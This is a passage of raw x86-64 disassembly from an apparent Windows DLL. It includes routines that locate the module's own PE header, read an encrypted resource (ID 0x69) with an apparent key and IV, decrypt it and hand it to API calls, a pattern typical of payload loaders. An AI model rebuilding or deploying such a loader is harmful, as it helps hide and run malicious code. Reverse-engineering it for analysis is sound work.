   1800025e1:	66 33 5c 24 0a       	xor    0xa(%rsp),%bx
   1800025e6:	e9 03 01 00 00       	jmp    0x1800026ee
   1800025eb:	44 0f b7 44 24 0e    	movzwl 0xe(%rsp),%r8d
   1800025f1:	66 33 c8             	xor    %ax,%cx
   1800025f4:	66 89 4c 24 08       	mov    %cx,0x8(%rsp)
   1800025f9:	44 0f b7 c9          	movzwl %cx,%r9d
   1800025fd:	44 0f b7 64 24 08    	movzwl 0x8(%rsp),%r12d
   180002603:	66 45 33 cf          	xor    %r15w,%r9w
   180002607:	0f b7 4c 24 12       	movzwl 0x12(%rsp),%ecx
   18000260c:	66 44 33 c2          	xor    %dx,%r8w
   180002610:	66 33 0c 24          	xor    (%rsp),%cx
   180002614:	45 0f b7 da          	movzwl %r10w,%r11d
   180002618:	66 44 33 de          	xor    %si,%r11w
   18000261c:	44 0f b7 d3          	movzwl %bx,%r10d
   180002620:	66 44 33 54 24 06    	xor    0x6(%rsp),%r10w
   180002626:	0f b7 c1             	movzwl %cx,%eax
   180002629:	66 41 33 c1          	xor    %r9w,%ax
   18000262d:	41 0f b7 f5          	movzwl %r13w,%esi
   180002631:	66 33 74 24 1c       	xor    0x1c(%rsp),%si
   180002636:	66 41 33 c3          	xor    %r11w,%ax
   18000263a:	66 33 84 24 80 00 00 	xor    0x80(%rsp),%ax
   180002641:	00 
   180002642:	44 0f b7 fe          	movzwl %si,%r15d
   180002646:	44 0f b7 6c 24 14    	movzwl 0x14(%rsp),%r13d
   18000264c:	66 44 33 fa          	xor    %dx,%r15w
   180002650:	66 44 33 6c 24 04    	xor    0x4(%rsp),%r13w
   180002656:	66 41 33 cf          	xor    %r15w,%cx
   18000265a:	66 89 47 0e          	mov    %ax,0xe(%rdi)
   18000265e:	66 41 33 f3          	xor    %r11w,%si
   180002662:	66 41 33 f4          	xor    %r12w,%si
   180002666:	66 41 33 cc          	xor    %r12w,%cx
   18000266a:	66 33 74 24 04       	xor    0x4(%rsp),%si
   18000266f:	66 45 33 f9          	xor    %r9w,%r15w
   180002673:	66 33 4c 24 10       	xor    0x10(%rsp),%cx
   180002678:	41 0f b7 d8          	movzwl %r8w,%ebx
   18000267c:	66 33 5c 24 0c       	xor    0xc(%rsp),%bx
   180002681:	41 0f b7 d2          	movzwl %r10w,%edx
   180002685:	66 33 54 24 12       	xor    0x12(%rsp),%dx
   18000268a:	0f b7 eb             	movzwl %bx,%ebp
   18000268d:	66 33 74 24 0e       	xor    0xe(%rsp),%si
   180002692:	66 33 ea             	xor    %dx,%bp
   180002695:	66 41 33 da          	xor    %r10w,%bx
   180002699:	66 41 33 e9          	xor    %r9w,%bp
   18000269d:	66 33 9c 24 88 00 00 	xor    0x88(%rsp),%bx
   1800026a4:	00 
   1800026a5:	66 41 33 eb          	xor    %r11w,%bp
   1800026a9:	66 33 5c 24 16       	xor    0x16(%rsp),%bx
   1800026ae:	0f b7 c2             	movzwl %dx,%eax
   1800026b1:	66 33 6c 24 70       	xor    0x70(%rsp),%bp
   1800026b6:	66 41 33 c5          	xor    %r13w,%ax
   1800026ba:	66 41 33 c4          	xor    %r12w,%ax
   1800026be:	45 0f b7 f5          	movzwl %r13w,%r14d
   1800026c2:	66 33 44 24 1e       	xor    0x1e(%rsp),%ax
   1800026c7:	66 45 33 f1          	xor    %r9w,%r14w
   1800026cb:	66 45 33 f0          	xor    %r8w,%r14w
   1800026cf:	66 45 33 fb          	xor    %r11w,%r15w
   1800026d3:	66 44 33 74 24 0a    	xor    0xa(%rsp),%r14w
   1800026d9:	66 f7 d1             	not    %cx
   1800026dc:	66 33 1c 24          	xor    (%rsp),%bx
   1800026e0:	66 41 f7 d6          	not    %r14w
   1800026e4:	66 f7 d3             	not    %bx
   1800026e7:	66 89 4f 0c          	mov    %cx,0xc(%rdi)
   1800026eb:	66 f7 d0             	not    %ax
   1800026ee:	66 89 5f 0a          	mov    %bx,0xa(%rdi)
   1800026f2:	66 44 89 7f 08       	mov    %r15w,0x8(%rdi)
   1800026f7:	66 89 77 06          	mov    %si,0x6(%rdi)
   1800026fb:	66 89 6f 04          	mov    %bp,0x4(%rdi)
   1800026ff:	66 89 47 02          	mov    %ax,0x2(%rdi)
   180002703:	66 44 89 37          	mov    %r14w,(%rdi)
   180002707:	48 83 c4 28          	add    $0x28,%rsp
   18000270b:	41 5f                	pop    %r15
   18000270d:	41 5e                	pop    %r14
   18000270f:	41 5d                	pop    %r13
   180002711:	41 5c                	pop    %r12
   180002713:	5f                   	pop    %rdi
   180002714:	5e                   	pop    %rsi
   180002715:	5d                   	pop    %rbp
   180002716:	5b                   	pop    %rbx
   180002717:	c3                   	ret
   180002718:	cc                   	int3
   180002719:	cc                   	int3
   18000271a:	cc                   	int3
   18000271b:	cc                   	int3
   18000271c:	cc                   	int3
   18000271d:	cc                   	int3
   18000271e:	cc                   	int3
   18000271f:	cc                   	int3
   180002720:	48 8b c4             	mov    %rsp,%rax
   180002723:	53                   	push   %rbx
   180002724:	48 81 ec 70 03 00 00 	sub    $0x370,%rsp
   18000272b:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000272e:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   180002733:	33 db                	xor    %ebx,%ebx
   180002735:	33 d2                	xor    %edx,%edx
   180002737:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   18000273d:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180002741:	48 89 58 10          	mov    %rbx,0x10(%rax)
   180002745:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   18000274a:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   18000274f:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   180002754:	e8 87 05 00 00       	call   0x180002ce0
   180002759:	33 d2                	xor    %edx,%edx
   18000275b:	48 8d 8c 24 60 01 00 	lea    0x160(%rsp),%rcx
   180002762:	00 
   180002763:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   180002769:	e8 72 05 00 00       	call   0x180002ce0
   18000276e:	48 8d 84 24 60 01 00 	lea    0x160(%rsp),%rax
   180002775:	00 
   180002776:	45 33 c9             	xor    %r9d,%r9d
   180002779:	45 33 c0             	xor    %r8d,%r8d
   18000277c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002781:	8d 53 0e             	lea    0xe(%rbx),%edx
   180002784:	33 c9                	xor    %ecx,%ecx
   180002786:	ff 15 bc 18 00 00    	call   *0x18bc(%rip)        # 0x180004048
   18000278c:	48 8d 05 8d ff ff ff 	lea    -0x73(%rip),%rax        # 0x180002720
   180002793:	41 b8 4d 5a 00 00    	mov    $0x5a4d,%r8d
   180002799:	41 b9 0b 02 00 00    	mov    $0x20b,%r9d
   18000279f:	90                   	nop
   1800027a0:	66 44 39 00          	cmp    %r8w,(%rax)
   1800027a4:	75 15                	jne    0x1800027bb
   1800027a6:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   1800027aa:	81 3c 02 50 45 00 00 	cmpl   $0x4550,(%rdx,%rax,1)
   1800027b1:	75 08                	jne    0x1800027bb
   1800027b3:	66 44 85 4c 02 18    	test   %r9w,0x18(%rdx,%rax,1)
   1800027b9:	75 05                	jne    0x1800027c0
   1800027bb:	48 ff c8             	dec    %rax
   1800027be:	eb e0                	jmp    0x1800027a0
   1800027c0:	44 8b 8c 02 98 00 00 	mov    0x98(%rdx,%rax,1),%r9d
   1800027c7:	00 
   1800027c8:	45 0f b7 44 01 0e    	movzwl 0xe(%r9,%rax,1),%r8d
   1800027ce:	4d 8d 14 01          	lea    (%r9,%rax,1),%r10
   1800027d2:	41 0f b7 4a 0c       	movzwl 0xc(%r10),%ecx
   1800027d7:	4c 03 c1             	add    %rcx,%r8
   1800027da:	0f 84 45 01 00 00    	je     0x180002925
   1800027e0:	41 8b 4c da 14       	mov    0x14(%r10,%rbx,8),%ecx
   1800027e5:	85 c9                	test   %ecx,%ecx
   1800027e7:	0f 89 38 01 00 00    	jns    0x180002925
   1800027ed:	0f ba f1 1f          	btr    $0x1f,%ecx
   1800027f1:	49 03 c9             	add    %r9,%rcx
   1800027f4:	8b 54 01 14          	mov    0x14(%rcx,%rax,1),%edx
   1800027f8:	85 d2                	test   %edx,%edx
   1800027fa:	79 08                	jns    0x180002804
   1800027fc:	66 83 7c 01 10 69    	cmpw   $0x69,0x10(%rcx,%rax,1)
   180002802:	74 13                	je     0x180002817
   180002804:	48 ff c3             	inc    %rbx
   180002807:	49 3b d8             	cmp    %r8,%rbx
   18000280a:	72 d4                	jb     0x1800027e0
   18000280c:	33 c0                	xor    %eax,%eax
   18000280e:	48 81 c4 70 03 00 00 	add    $0x370,%rsp
   180002815:	5b                   	pop    %rbx
   180002816:	c3                   	ret
   180002817:	0f ba f2 1f          	btr    $0x1f,%edx
   18000281b:	48 89 bc 24 90 03 00 	mov    %rdi,0x390(%rsp)
   180002822:	00 
   180002823:	49 03 d1             	add    %r9,%rdx
   180002826:	8b 4c 02 14          	mov    0x14(%rdx,%rax,1),%ecx
   18000282a:	0f ba f1 1f          	btr    $0x1f,%ecx
   18000282e:	49 03 c9             	add    %r9,%rcx
   180002831:	8b 1c 01             	mov    (%rcx,%rax,1),%ebx
   180002834:	8b 7c 01 04          	mov    0x4(%rcx,%rax,1),%edi
   180002838:	48 03 d8             	add    %rax,%rbx
   18000283b:	0f 84 dc 00 00 00    	je     0x18000291d
   180002841:	85 ff                	test   %edi,%edi
   180002843:	0f 84 d4 00 00 00    	je     0x18000291d
   180002849:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   18000284f:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180002854:	48 8b d3             	mov    %rbx,%rdx
   180002857:	e8 54 15 00 00       	call   0x180003db0
   18000285c:	48 8d 53 20          	lea    0x20(%rbx),%rdx
   180002860:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   180002866:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   18000286b:	e8 40 15 00 00       	call   0x180003db0
   180002870:	e8 9b 0c 00 00       	call   0x180003510
   180002875:	85 c0                	test   %eax,%eax
   180002877:	0f 84 a0 00 00 00    	je     0x18000291d
   18000287d:	e8 0e 09 00 00       	call   0x180003190
   180002882:	85 c0                	test   %eax,%eax
   180002884:	0f 84 93 00 00 00    	je     0x18000291d
   18000288a:	e8 61 0d 00 00       	call   0x1800035f0
   18000288f:	85 c0                	test   %eax,%eax
   180002891:	0f 84 86 00 00 00    	je     0x18000291d
   180002897:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   18000289c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1800028a1:	e8 1a 01 00 00       	call   0x1800029c0
   1800028a6:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1800028ab:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1800028b0:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1800028b5:	e8 26 ea ff ff       	call   0x1800012e0
   1800028ba:	8d 47 d0             	lea    -0x30(%rdi),%eax
   1800028bd:	44 8b c0             	mov    %eax,%r8d
   1800028c0:	48 8d 53 30          	lea    0x30(%rbx),%rdx
   1800028c4:	4c 8d 8c 24 80 03 00 	lea    0x380(%rsp),%r9
   1800028cb:	00 
   1800028cc:	8b f8                	mov    %eax,%edi
   1800028ce:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1800028d3:	e8 d8 e8 ff ff       	call   0x1800011b0
   1800028d8:	84 c0                	test   %al,%al
   1800028da:	74 41                	je     0x18000291d
   1800028dc:	48 8b 8c 24 80 03 00 	mov    0x380(%rsp),%rcx
   1800028e3:	00 
   1800028e4:	4c 8d 84 24 88 03 00 	lea    0x388(%rsp),%r8
   1800028eb:	00 
   1800028ec:	8b d7                	mov    %edi,%edx
   1800028ee:	e8 dd 09 00 00       	call   0x1800032d0
   1800028f3:	85 c0                	test   %eax,%eax
   1800028f5:	74 26                	je     0x18000291d
   1800028f7:	ff 15 0b 17 00 00    	call   *0x170b(%rip)        # 0x180004008
   1800028fd:	4c 8b 84 24 80 03 00 	mov    0x380(%rsp),%r8
   180002904:	00 
   180002905:	33 d2                	xor    %edx,%edx
   180002907:	48 8b c8             	mov    %rax,%rcx
   18000290a:	ff 15 08 17 00 00    	call   *0x1708(%rip)        # 0x180004018
   180002910:	48 8b 8c 24 88 03 00 	mov    0x388(%rsp),%rcx
   180002917:	00 
   180002918:	e8 43 0b 00 00       	call   0x180003460
   18000291d:	48 8b bc 24 90 03 00 	mov    0x390(%rsp),%rdi
   180002924:	00 
   180002925:	33 c0                	xor    %eax,%eax
   180002927:	48 81 c4 70 03 00 00 	add    $0x370,%rsp
   18000292e:	5b                   	pop    %rbx
   18000292f:	c3                   	ret
   180002930:	e9 eb fd ff ff       	jmp    0x180002720
   180002935:	cc                   	int3
   180002936:	cc                   	int3
   180002937:	cc                   	int3
   180002938:	cc                   	int3
   180002939:	cc                   	int3
   18000293a:	cc                   	int3
   18000293b:	cc                   	int3
   18000293c:	cc                   	int3
   18000293d:	cc                   	int3
   18000293e:	cc                   	int3
   18000293f:	cc                   	int3
   180002940:	33 c0                	xor    %eax,%eax
   180002942:	c3                   	ret
   180002943:	cc                   	int3
   180002944:	cc                   	int3
   180002945:	cc                   	int3
   180002946:	cc                   	int3
   180002947:	cc                   	int3
   180002948:	cc                   	int3
   180002949:	cc                   	int3
   18000294a:	cc                   	int3
   18000294b:	cc                   	int3
   18000294c:	cc                   	int3
   18000294d:	cc                   	int3
   18000294e:	cc                   	int3
   18000294f:	cc                   	int3
   180002950:	48 83 ec 28          	sub    $0x28,%rsp
   180002954:	83 fa 01             	cmp    $0x1,%edx
   180002957:	75 55                	jne    0x1800029ae
   180002959:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   18000295e:	33 db                	xor    %ebx,%ebx
   180002960:	89 5c 24 38          	mov    %ebx,0x38(%rsp)
   180002964:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180002969:	ff 15 a1 16 00 00    	call   *0x16a1(%rip)        # 0x180004010
   18000296f:	48 8b c8             	mov    %rax,%rcx
   180002972:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   180002977:	ff 15 c3 16 00 00    	call   *0x16c3(%rip)        # 0x180004040
   18000297d:	48 8b f8             	mov    %rax,%rdi
   180002980:	39 5c 24 38          	cmp    %ebx,0x38(%rsp)
   180002984:	7e 14                	jle    0x18000299a
   180002986:	48 8b 0f             	mov    (%rdi),%rcx
   180002989:	e8 32 13 00 00       	call   0x180003cc0
   18000298e:	ff c3                	inc    %ebx
   180002990:	48 8d 7f 08          	lea    0x8(%rdi),%rdi
   180002994:	3b 5c 24 38          	cmp    0x38(%rsp),%ebx
   180002998:	7c ec                	jl     0x180002986
   18000299a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000299f:	b8 01 00 00 00       	mov    $0x1,%eax
   1800029a4:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   1800029a9:	48 83 c4 28          	add    $0x28,%rsp
   1800029ad:	c3                   	ret
   1800029ae:	b8 01 00 00 00       	mov    $0x1,%eax
   1800029b3:	48 83 c4 28          	add    $0x28,%rsp
   1800029b7:	c3                   	ret
   1800029b8:	cc                   	int3
   1800029b9:	cc                   	int3
   1800029ba:	cc                   	int3
   1800029bb:	cc                   	int3
   1800029bc:	cc                   	int3
   1800029bd:	cc                   	int3
   1800029be:	cc                   	int3
   1800029bf:	cc                   	int3
   1800029c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800029c5:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1800029ca:	55                   	push   %rbp
   1800029cb:	56                   	push   %rsi
   1800029cc:	57                   	push   %rdi
   1800029cd:	41 54                	push   %r12
   1800029cf:	41 55                	push   %r13
   1800029d1:	41 56                	push   %r14
   1800029d3:	41 57                	push   %r15
   1800029d5:	48 83 ec 20          	sub    $0x20,%rsp
   1800029d9:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   1800029dd:	48 8b c1             	mov    %rcx,%rax
   1800029e0:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1800029e6:	66 0f 6f 0d f2 16 00 	movdqa 0x16f2(%rip),%xmm1        # 0x1800040e0
   1800029ed:	00 
   1800029ee:	66 0f f8 c1          	psubb  %xmm1,%xmm0
   1800029f2:	f3 0f 7f 02          	movdqu %xmm0,(%rdx)
   1800029f6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1800029fd:	00 00 00 
   180002a00:	f3 0f 6f 00          	movdqu (%rax),%xmm0
   180002a04:	48 8d 40 10          	lea    0x10(%rax),%rax
   180002a08:	66 0f f8 c1          	psubb  %xmm1,%xmm0
   180002a0c:	f3 0f 7f 40 f0       	movdqu %xmm0,-0x10(%rax)
   180002a11:	49 83 e8 01          	sub    $0x1,%r8
   180002a15:	75 e9                	jne    0x180002a00
   180002a17:	0f b6 01             	movzbl (%rcx),%eax
   180002a1a:	30 02                	xor    %al,(%rdx)
   180002a1c:	0f b6 01             	movzbl (%rcx),%eax
   180002a1f:	30 42 01             	xor    %al,0x1(%rdx)
   180002a22:	0f b6 01             	movzbl (%rcx),%eax
   180002a25:	30 42 02             	xor    %al,0x2(%rdx)
   180002a28:	0f b6 01             	movzbl (%rcx),%eax
   180002a2b:	30 42 03             	xor    %al,0x3(%rdx)
   180002a2e:	0f b6 01             	movzbl (%rcx),%eax
   180002a31:	30 42 04             	xor    %al,0x4(%rdx)
   180002a34:	0f b6 01             	movzbl (%rcx),%eax
   180002a37:	30 42 05             	xor    %al,0x5(%rdx)
   180002a3a:	0f b6 01             	movzbl (%rcx),%eax
   180002a3d:	30 42 06             	xor    %al,0x6(%rdx)
   180002a40:	0f b6 01             	movzbl (%rcx),%eax
   180002a43:	30 42 07             	xor    %al,0x7(%rdx)
   180002a46:	0f b6 01             	movzbl (%rcx),%eax
   180002a49:	30 42 08             	xor    %al,0x8(%rdx)
   180002a4c:	0f b6 01             	movzbl (%rcx),%eax
   180002a4f:	30 42 09             	xor    %al,0x9(%rdx)
   180002a52:	0f b6 01             	movzbl (%rcx),%eax
   180002a55:	30 42 0a             	xor    %al,0xa(%rdx)
   180002a58:	0f b6 01             	movzbl (%rcx),%eax
   180002a5b:	30 42 0b             	xor    %al,0xb(%rdx)
   180002a5e:	0f b6 01             	movzbl (%rcx),%eax
   180002a61:	30 42 0c             	xor    %al,0xc(%rdx)
   180002a64:	0f b6 01             	movzbl (%rcx),%eax
   180002a67:	30 42 0d             	xor    %al,0xd(%rdx)
   180002a6a:	0f b6 01             	movzbl (%rcx),%eax
   180002a6d:	30 42 0e             	xor    %al,0xe(%rdx)
   180002a70:	0f b6 01             	movzbl (%rcx),%eax
   180002a73:	30 42 0f             	xor    %al,0xf(%rdx)
   180002a76:	0f b6 51 0e          	movzbl 0xe(%rcx),%edx
   180002a7a:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   180002a7e:	44 0f b6 41 02       	movzbl 0x2(%rcx),%r8d
   180002a83:	44 0f b6 49 03       	movzbl 0x3(%rcx),%r9d
   180002a88:	44 0f b6 51 04       	movzbl 0x4(%rcx),%r10d
   180002a8d:	44 0f b6 59 05       	movzbl 0x5(%rcx),%r11d
   180002a92:	0f b6 59 06          	movzbl 0x6(%rcx),%ebx
   180002a96:	0f b6 79 07          	movzbl 0x7(%rcx),%edi
   180002a9a:	0f b6 71 08          	movzbl 0x8(%rcx),%esi
   180002a9e:	0f b6 69 09          	movzbl 0x9(%rcx),%ebp
   180002aa2:	44 0f b6 71 0a       	movzbl 0xa(%rcx),%r14d
   180002aa7:	44 0f b6 79 0b       	movzbl 0xb(%rcx),%r15d
   180002aac:	44 0f b6 61 0c       	movzbl 0xc(%rcx),%r12d
   180002ab1:	44 0f b6 69 0d       	movzbl 0xd(%rcx),%r13d
   180002ab6:	88 54 24 70          	mov    %dl,0x70(%rsp)
   180002aba:	0f b6 51 0f          	movzbl 0xf(%rcx),%edx
   180002abe:	88 54 24 78          	mov    %dl,0x78(%rsp)
   180002ac2:	0f b6 51 10          	movzbl 0x10(%rcx),%edx
   180002ac6:	88 14 24             	mov    %dl,(%rsp)
   180002ac9:	0f b6 51 11          	movzbl 0x11(%rcx),%edx
   180002acd:	88 54 24 01          	mov    %dl,0x1(%rsp)
   180002ad1:	0f b6 51 12          	movzbl 0x12(%rcx),%edx
   180002ad5:	88 54 24 02          	mov    %dl,0x2(%rsp)
   180002ad9:	0f b6 51 13          	movzbl 0x13(%rcx),%edx
   180002add:	88 54 24 03          	mov    %dl,0x3(%rsp)
   180002ae1:	0f b6 51 14          	movzbl 0x14(%rcx),%edx
   180002ae5:	88 54 24 04          	mov    %dl,0x4(%rsp)
   180002ae9:	0f b6 51 15          	movzbl 0x15(%rcx),%edx
   180002aed:	88 54 24 05          	mov    %dl,0x5(%rsp)
   180002af1:	0f b6 51 16          	movzbl 0x16(%rcx),%edx
   180002af5:	88 54 24 06          	mov    %dl,0x6(%rsp)
   180002af9:	0f b6 51 17          	movzbl 0x17(%rcx),%edx
   180002afd:	88 54 24 07          	mov    %dl,0x7(%rsp)
   180002b01:	0f b6 51 18          	movzbl 0x18(%rcx),%edx
   180002b05:	88 54 24 08          	mov    %dl,0x8(%rsp)
   180002b09:	0f b6 51 19          	movzbl 0x19(%rcx),%edx
   180002b0d:	88 54 24 09          	mov    %dl,0x9(%rsp)
   180002b11:	0f b6 51 1a          	movzbl 0x1a(%rcx),%edx
   180002b15:	88 54 24 0a          	mov    %dl,0xa(%rsp)
   180002b19:	0f b6 51 1b          	movzbl 0x1b(%rcx),%edx
   180002b1d:	88 54 24 0b          	mov    %dl,0xb(%rsp)
   180002b21:	0f b6 51 1c          	movzbl 0x1c(%rcx),%edx
   180002b25:	88 54 24 0c          	mov    %dl,0xc(%rsp)
   180002b29:	0f b6 51 1d          	movzbl 0x1d(%rcx),%edx
   180002b2d:	88 54 24 0d          	mov    %dl,0xd(%rsp)
   180002b31:	0f b6 51 1e          	movzbl 0x1e(%rcx),%edx
   180002b35:	88 54 24 0e          	mov    %dl,0xe(%rsp)
   180002b39:	0f b6 51 1f          	movzbl 0x1f(%rcx),%edx
   180002b3d:	88 54 24 0f          	mov    %dl,0xf(%rsp)
   180002b41:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   180002b46:	48 c7 44 24 18 10 00 	movq   $0x10,0x18(%rsp)
   180002b4d:	00 00 
   180002b4f:	90                   	nop
   180002b50:	32 02                	xor    (%rdx),%al
   180002b52:	88 41 01             	mov    %al,0x1(%rcx)
   180002b55:	44 32 02             	xor    (%rdx),%r8b
   180002b58:	88 44 24 10          	mov    %al,0x10(%rsp)
   180002b5c:	0f b6 44 24 70       	movzbl 0x70(%rsp),%eax
   180002b61:	44 88 41 02          	mov    %r8b,0x2(%rcx)
   180002b65:	44 32 0a             	xor    (%rdx),%r9b
   180002b68:	44 88 49 03          	mov    %r9b,0x3(%rcx)
   180002b6c:	44 32 12             	xor    (%rdx),%r10b
   180002b6f:	44 88 51 04          	mov    %r10b,0x4(%rcx)
   180002b73:	44 32 1a             	xor    (%rdx),%r11b
   180002b76:	44 88 59 05          	mov    %r11b,0x5(%rcx)
   180002b7a:	32 1a                	xor    (%rdx),%bl
   180002b7c:	88 59 06             	mov    %bl,0x6(%rcx)
   180002b7f:	40 32 3a             	xor    (%rdx),%dil
   180002b82:	40 88 79 07          	mov    %dil,0x7(%rcx)
   180002b86:	40 32 32             	xor    (%rdx),%sil
   180002b89:	40 88 71 08          	mov    %sil,0x8(%rcx)
   180002b8d:	40 32 2a             	xor    (%rdx),%bpl
   180002b90:	40 88 69 09          	mov    %bpl,0x9(%rcx)
   180002b94:	44 32 32             	xor    (%rdx),%r14b
   180002b97:	44 88 71 0a          	mov    %r14b,0xa(%rcx)
   180002b9b:	44 32 3a             	xor    (%rdx),%r15b
   180002b9e:	44 88 79 0b          	mov    %r15b,0xb(%rcx)
   180002ba2:	44 32 22             	xor    (%rdx),%r12b
   180002ba5:	44 88 61 0c          	mov    %r12b,0xc(%rcx)
   180002ba9:	44 32 2a             	xor    (%rdx),%r13b
   180002bac:	44 88 69 0d          	mov    %r13b,0xd(%rcx)
   180002bb0:	32 02                	xor    (%rdx),%al
   180002bb2:	88 44 24 70          	mov    %al,0x70(%rsp)
   180002bb6:	88 41 0e             	mov    %al,0xe(%rcx)
   180002bb9:	0f b6 44 24 78       	movzbl 0x78(%rsp),%eax
   180002bbe:	32 02                	xor    (%rdx),%al
   180002bc0:	88 44 24 78          	mov    %al,0x78(%rsp)
   180002bc4:	88 41 0f             	mov    %al,0xf(%rcx)
   180002bc7:	0f b6 04 24          	movzbl (%rsp),%eax
   180002bcb:	32 02                	xor    (%rdx),%al
   180002bcd:	88 04 24             	mov    %al,(%rsp)
   180002bd0:	88 41 10             	mov    %al,0x10(%rcx)
   180002bd3:	0f b6 44 24 01       	movzbl 0x1(%rsp),%eax
   180002bd8:	32 02                	xor    (%rdx),%al
   180002bda:	88 44 24 01          	mov    %al,0x1(%rsp)
   180002bde:	88 41 11             	mov    %al,0x11(%rcx)
   180002be1:	0f b6 44 24 02       	movzbl 0x2(%rsp),%eax
   180002be6:	32 02                	xor    (%rdx),%al
   180002be8:	88 44 24 02          	mov    %al,0x2(%rsp)
   180002bec:	88 41 12             	mov    %al,0x12(%rcx)
   180002bef:	0f b6 44 24 03       	movzbl 0x3(%rsp),%eax
   180002bf4:	32 02                	xor    (%rdx),%al
   180002bf6:	88 44 24 03          	mov    %al,0x3(%rsp)
   180002bfa:	88 41 13             	mov    %al,0x13(%rcx)
   180002bfd:	0f b6 44 24 04       	movzbl 0x4(%rsp),%eax
   180002c02:	32 02                	xor    (%rdx),%al
   180002c04:	88 44 24 04          	mov    %al,0x4(%rsp)
   180002c08:	88 41 14             	mov    %al,0x14(%rcx)
   180002c0b:	0f b6 44 24 05       	movzbl 0x5(%rsp),%eax
   180002c10:	32 02                	xor    (%rdx),%al
   180002c12:	88 44 24 05          	mov    %al,0x5(%rsp)
   180002c16:	88 41 15             	mov    %al,0x15(%rcx)
   180002c19:	0f b6 44 24 06       	movzbl 0x6(%rsp),%eax
   180002c1e:	32 02                	xor    (%rdx),%al
   180002c20:	88 44 24 06          	mov    %al,0x6(%rsp)
   180002c24:	88 41 16             	mov    %al,0x16(%rcx)
   180002c27:	0f b6 44 24 07       	movzbl 0x7(%rsp),%eax
   180002c2c:	32 02                	xor    (%rdx),%al
   180002c2e:	88 44 24 07          	mov    %al,0x7(%rsp)
   180002c32:	88 41 17             	mov    %al,0x17(%rcx)
   180002c35:	0f b6 44 24 08       	movzbl 0x8(%rsp),%eax
   180002c3a:	32 02                	xor    (%rdx),%al
   180002c3c:	88 44 24 08          	mov    %al,0x8(%rsp)
   180002c40:	88 41 18             	mov    %al,0x18(%rcx)
   180002c43:	0f b6 44 24 09       	movzbl 0x9(%rsp),%eax
   180002c48:	32 02                	xor    (%rdx),%al
   180002c4a:	88 44 24 09          	mov    %al,0x9(%rsp)
   180002c4e:	88 41 19             	mov    %al,0x19(%rcx)
   180002c51:	0f b6 44 24 0a       	movzbl 0xa(%rsp),%eax
   180002c56:	32 02                	xor    (%rdx),%al
   180002c58:	88 44 24 0a          	mov    %al,0xa(%rsp)
   180002c5c:	88 41 1a             	mov    %al,0x1a(%rcx)
   180002c5f:	0f b6 44 24 0b       	movzbl 0xb(%rsp),%eax
   180002c64:	32 02                	xor    (%rdx),%al
   180002c66:	88 44 24 0b          	mov    %al,0xb(%rsp)
   180002c6a:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   180002c6e:	88 41 1b             	mov    %al,0x1b(%rcx)
   180002c71:	0f b6 44 24 0c       	movzbl 0xc(%rsp),%eax
   180002c76:	32 42 ff             	xor    -0x1(%rdx),%al
   180002c79:	88 44 24 0c          	mov    %al,0xc(%rsp)
   180002c7d:	88 41 1c             	mov    %al,0x1c(%rcx)
   180002c80:	0f b6 44 24 0d       	movzbl 0xd(%rsp),%eax
   180002c85:	32 42 ff             	xor    -0x1(%rdx),%al
   180002c88:	88 44 24 0d          	mov    %al,0xd(%rsp)
   180002c8c:	88 41 1d             	mov    %al,0x1d(%rcx)
   180002c8f:	0f b6 44 24 0e       	movzbl 0xe(%rsp),%eax
   180002c94:	32 42 ff             	xor    -0x1(%rdx),%al
   180002c97:	88 44 24 0e          	mov    %al,0xe(%rsp)
   180002c9b:	88 41 1e             	mov    %al,0x1e(%rcx)
   180002c9e:	0f b6 44 24 0f       	movzbl 0xf(%rsp),%eax
   180002ca3:	32 42 ff             	xor    -0x1(%rdx),%al
   180002ca6:	48 83 6c 24 18 01    	subq   $0x1,0x18(%rsp)
   180002cac:	88 44 24 0f          	mov    %al,0xf(%rsp)
   180002cb0:	88 41 1f             	mov    %al,0x1f(%rcx)
   180002cb3:	0f b6 44 24 10       	movzbl 0x10(%rsp),%eax
   180002cb8:	0f 85 92 fe ff ff    	jne    0x180002b50
   180002cbe:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   180002cc3:	48 83 c4 20          	add    $0x20,%rsp
   180002cc7:	41 5f                	pop    %r15
   180002cc9:	41 5e                	pop    %r14
   180002ccb:	41 5d                	pop    %r13
   180002ccd:	41 5c                	pop    %r12
   180002ccf:	5f                   	pop    %rdi
   180002cd0:	5e                   	pop    %rsi
   180002cd1:	5d                   	pop    %rbp
   180002cd2:	c3                   	ret
   180002cd3:	cc                   	int3
   180002cd4:	cc                   	int3
   180002cd5:	cc                   	int3
   180002cd6:	cc                   	int3
   180002cd7:	cc                   	int3
   180002cd8:	cc                   	int3
   180002cd9:	cc                   	int3
   180002cda:	cc                   	int3
